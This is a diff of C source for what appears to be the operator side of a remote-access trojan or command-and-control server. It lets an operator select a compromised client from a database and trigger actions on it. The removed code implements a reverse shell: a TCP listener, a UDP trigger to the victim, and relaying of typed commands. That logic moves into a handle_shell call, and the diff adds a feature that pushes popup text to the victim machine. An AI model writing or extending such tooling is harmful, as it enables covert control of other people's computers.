@@ -54,78 +54,40 @@ void solo_interaction(struct db* db, int sockfd_u)
 {
     int user;
     int choice;
-    int sockfd_tc;
     struct sockaddr_in sa;
-    struct sockaddr_in tsa;
-    int junk = 16;
+    int i = 0;
     char shll = _SIG_SHLL;
+    char cout = _SIG_COUT;
     char buf[2048];
-    int response;
+    
     int client_fd;
     int select_result;
-    memset(&buf, 0,2048);
+    char ch;
+    memset(buf, 0, 2048);
+     // Buffer to hold the IP address string
     printf("Choose a user\n");
     print_db(db);
     isc(&user);
     printf("Choose the deed:\n0 - Cout: popup window on client machine UNIMPLEMENTED\n1 - \
 Shell: pop a reverse shell\n2 - File: send or recieve a file UNIMPLEMENTED\n3 - exit this menu\n");
     isc(&choice);
+    sa = *((struct sockaddr_in*)db->st[user]->sa);
     switch(choice){
-        // case 0:
-        //     DBGLG("Unimplemented\n");
-        //     return;
-        case 1:
-            sa = *((struct sockaddr_in*)db->st[user]->sa);
-                char ip[INET_ADDRSTRLEN]; // Buffer to hold the IP address string
-
-            // Convert the binary IP address to a human-readable string
-            inet_ntop(AF_INET, &(sa.sin_addr), ip, INET_ADDRSTRLEN);
-
-            // Print the IP address and port number
-            printf("IP Address: %s\n", ip);
-
-
-            printf("Port: %d\n", ntohs(sa.sin_port));
-            update_sockaddr_in(&tsa, AF_INET, TCP_PORT, NULL);
-            create_tcp_socket(&sockfd_tc);
-            bind_socket(sockfd_tc, &tsa);
-            struct timeval timeout;
-            timeout.tv_sec = 4;
-            timeout.tv_usec = 0;
-            if (setsockopt(sockfd_u, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
-                perror("setsockopt");
-                DBGLG("Could not set appropriate timeout\n");
-                exit(EXIT_FAILURE); 
+        case 0:
+            printf("Input what to show in a pop up:\n");
+                while (((ch = getchar()) != '\n' || i == 0) && i < sizeof(buf) - 1 ) {
+                buf[i++] = ch;
             }
-            if (setsockopt(sockfd_u, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
-                perror("setsockopt");
-                DBGLG("Could not set appropriate timeout\n");
-                exit(EXIT_FAILURE); 
-            }
-            listen_on_socket(sockfd_tc, 1);
-            send_udp(sockfd_u, &sa, &shll, 1);
-            if (((client_fd = accept(sockfd_tc, (struct sockaddr*) &sa, &junk)) < 0)){
-                perror("failed to accept tcp: ");
-                return;
-            }
-            sleep(1);
             
-            while ((response = recv(client_fd, buf, sizeof(buf), 0)) > 0) {
-                fd_set read_fds;
-                FD_ZERO(&read_fds);
-                FD_SET(client_fd, &read_fds);
-                struct timeval timeout1;
-                timeout.tv_sec = 0; // Timeout in seconds
-                timeout.tv_usec = 1000;
-                buf[response] = '\0';
-                printf("%s", buf);
-                fgets(buf, sizeof(buf), stdin);
-                if (send(client_fd, buf, strlen(buf), 0) <= 0){
-                    break;
-                }
-            }
-            close(client_fd);
-            close(sockfd_tc);
+            // Null-terminate the buffer
+            buf[i] = '\0';
+            printf("We got %d len and the string is %s\n", i, buf);
+            send_udp(sockfd_u, &sa, &cout, 1);
+            send_udp(sockfd_u, &sa, buf, strlen(buf));
+            break;
+        case 1:
+            // Convert the binary IP address to a human-readable string
+            handle_shell(sa, sockfd_u, _SIG_SHLL);
             break;
         default:
             DBGLG("Unimplemented, exiting\n");
@@ -182,9 +144,13 @@ int main(int argc, char **argv)
                 solo_interaction(db, sockfd_u);
                 break;
             case 2:
+                DBGLG("Killing listeners\n");
                 terminate_thread = 1;
                 pthread_join(tid, NULL);
+                DBGLG("Saving db\n");
                 save_db(db, "./db.db");
+                DBGLG("Closing sockets\n");
+                free_db(&db);
                 close(sockfd_u);
                 goto _exit;
             default:
